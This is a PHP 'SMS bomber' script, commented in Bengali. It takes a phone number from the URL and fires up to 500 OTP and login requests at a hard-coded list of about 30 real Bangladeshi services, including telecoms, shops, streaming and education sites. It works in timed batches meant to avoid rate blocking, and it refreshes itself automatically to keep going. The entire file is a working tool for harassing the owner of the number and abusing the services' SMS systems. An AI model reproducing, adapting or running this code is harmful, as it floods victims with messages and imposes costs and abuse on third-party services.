<?php
header('Content-Type: text/html; charset=utf-8');
error_reporting(0);

$phone = $_GET['phone'] ?? '';
$current_hit = isset($_GET['hit']) ? (int)$_GET['hit'] : 1;
$total_target = 500;
$batch_size = 5; // একবারে ৫টা করে যাবে (যাতে এপিআই ব্লক না হয়)

if(!$phone) die("Phone number missing!");

// ফোন ফরমেটিং
$phone_11 = preg_replace('/^\+?88/', '', $phone); 
if(substr($phone_11, 0, 1) !== "0") $phone_11 = "0" . $phone_11;
$phone_88 = "88" . $phone_11;             
$phone_plus88 = "+88" . $phone_11;        
$deepto_number = "+880" . substr($phone_11, -10); 
$phone_osudpotro = "+88-" . $phone_11;    
$phone_fundesh = substr($phone_11, 1);

// ==========================================
// 💥 ৩০+ এপিআই মাস্টার লিস্ট (তোর সব কালেকশন)
// ==========================================
$base_apis = [
    ["name"=>"ali2bd", "url"=>"https://edge.ali2bd.com/api/consumer/v1/auth/login", "method"=>"POST", "data"=>["username"=>$phone_11]],
    ["name"=>"hishabee", "url"=>"https://api.hishabee.business/api/V2/otp/send?mobile_number=$phone_11&country_code=88", "method"=>"POST"],
    ["name"=>"redx", "url"=>"https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", "method"=>"POST", "data"=>["phoneNumber"=>$phone_11]],
    ["name"=>"bikroy", "url"=>"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=$phone_11", "method"=>"GET"],
    ["name"=>"chardike", "url"=>"https://api.chardike.com/api/otp/send", "method"=>"POST", "data"=>["phone"=>$phone_11, "otp_type"=>"login"]],
    ["name"=>"bohubrihi", "url"=>"https://bb-api.bohubrihi.com/public/activity/otp", "method"=>"POST", "data"=>["phone"=>$phone_11, "intent"=>"login"]],
    ["name"=>"rokomari", "url"=>"https://www.rokomari.com/otp/send?emailOrPhone=".$phone_88."&countryCode=BD", "method"=>"GET"],
    ["name"=>"airtel", "url"=>"https://api.bd.airtel.com/v1/account/login/otp", "method"=>"POST", "data"=>["phone_number"=>$phone_11]],
    ["name"=>"ostad", "url"=>"https://api.ostad.app/api/v2/user/with-otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11]],
    ["name"=>"ghoorilearning", "url"=>"https://api.ghoorilearning.com/api/auth/signup/otp", "method"=>"POST", "data"=>["mobile_no"=>$phone_11]],
    ["name"=>"rabbithole", "url"=>"https://apix.rabbitholebd.com/appv2/login/requestOTP", "method"=>"POST", "data"=>["mobile"=>"+88".$phone_11]],
    ["name"=>"shomvob", "url"=>"https://backend-api.shomvob.co/api/v2/otp/phone", "method"=>"POST", "data"=>["phone"=>$phone_88]],
    ["name"=>"cokestudio", "url"=>"https://cokestudio23.sslwireless.com/api/store-and-send-otp", "method"=>"POST", "data"=>["msisdn"=>$phone_88]],
    ["name"=>"shadhin", "url"=>"https://connect.shadhinmusic.com/v1/api//otp/send", "method"=>"POST", "data"=>["msisdn"=>$phone_88]],
    ["name"=>"fundesh", "url"=>"https://fundesh.com.bd/api/auth/generateOTP", "method"=>"POST", "data"=>["msisdn"=>$phone_fundesh]],
    ["name"=>"shwapno", "url"=>"https://www.shwapno.com/api/auth", "method"=>"POST", "data"=>["phoneNumber"=>$phone_plus88]],
    ["name"=>"bdtickets", "url"=>"https://api.bdtickets.com/v1/auth", "method"=>"POST", "data"=>["phoneNumber"=>$phone_plus88]],
    ["name"=>"prothomalo", "url"=>"https://prod-api.viewlift.com/identity/signup?site=prothomalo", "method"=>"POST", "data"=>["phoneNumber"=>$phone_plus88]],
    ["name"=>"hoichoi", "url"=>"https://prod-api.viewlift.com/identity/signup?site=hoichoitv", "method"=>"POST", "data"=>["phoneNumber"=>$phone_plus88]],
    ["name"=>"osudpotro", "url"=>"https://api.osudpotro.com/api/v1/users/send_otp", "method"=>"POST", "data"=>["mobile"=>$phone_osudpotro]],
    ["name"=>"deeptoplay", "url"=>"https://api.deeptoplay.com/v2/auth/login?platform=web", "method"=>"POST", "data"=>["number"=>$deepto_number]],
    ["name"=>"ieducation", "url"=>"https://www.ieducationbd.com/api/account/check_user", "method"=>"POST", "data"=>["mobile"=>$phone_11]],
    ["name"=>"apex4u", "url"=>"https://api.apex4u.com/api/auth/login", "method"=>"POST", "data"=>["phoneNumber"=>$phone_11]],
    ["name"=>"grameenphone", "url"=>"https://weblogin.grameenphone.com/backend/api/v1/otp", "method"=>"POST", "data"=>["msisdn"=>$phone_11]],
    ["name"=>"pbs", "url"=>"https://apialpha.pbs.com.bd/api/OTP/generateOTP", "method"=>"POST", "data"=>["userPhone"=>$phone_11]],
    ["name"=>"ecourier", "url"=>"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=".$phone_11, "method"=>"GET"],
    ["name"=>"shikho", "url"=>"https://api.shikho.com/auth/v2/send/sms", "method"=>"POST", "data"=>["phone"=>$phone_88, "type"=>"student"]],
    ["name"=>"eonbazar", "url"=>"https://app.eonbazar.com/api/auth/register", "method"=>"POST", "data"=>["mobile"=>$phone_11]],
    ["name"=>"chorki", "url"=>"https://api-dynamic.chorki.com/v2/auth/login?country=BD", "method"=>"POST", "data"=>["number"=>$phone_plus88]],
    ["name"=>"swap", "url"=>"https://api.swap.com.bd/api/v1/send-otp/v2", "method"=>"POST", "data"=>["phone"=>$deepto_number]]
];

echo "<h3>Running 500 Requests... Current Batch: $current_hit - " . ($current_hit + $batch_size - 1) . "</h3>";

// ৩. ব্যাচ লুপ
for ($i = 0; $i < $batch_size; $i++) {
    $now = $current_hit + $i;
    if ($now > $total_target) break;

    $api = $base_apis[$now % count($base_apis)];
    
    $ch = curl_init($api['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    
    $headers = ['Content-Type: application/json', 'User-Agent: Mozilla/5.0'];
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if (($api['method'] ?? 'POST') === "POST") {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($api['data'] ?? []));
    }
    
    curl_exec($ch);
    curl_close($ch);
    
    echo "Hit $now: " . $api['name'] . " [SENT]<br>";
    
    // ৪. টাইম স্লিপ (তোর কথা মতো ১ সেকেন্ড করে গ্যাপ)
    sleep(1); 
}

// ৫. রিলোড লজিক
if (($current_hit + $batch_size) <= $total_target) {
    $next = $current_hit + $batch_size;
    $url = "?phone=$phone&hit=$next";
    echo "<p>Auto refreshing to continue...</p>";
    header("Refresh: 1; url=$url");
} else {
    echo "<h2>Successfully Completed 500 Requests!</h2>";
}
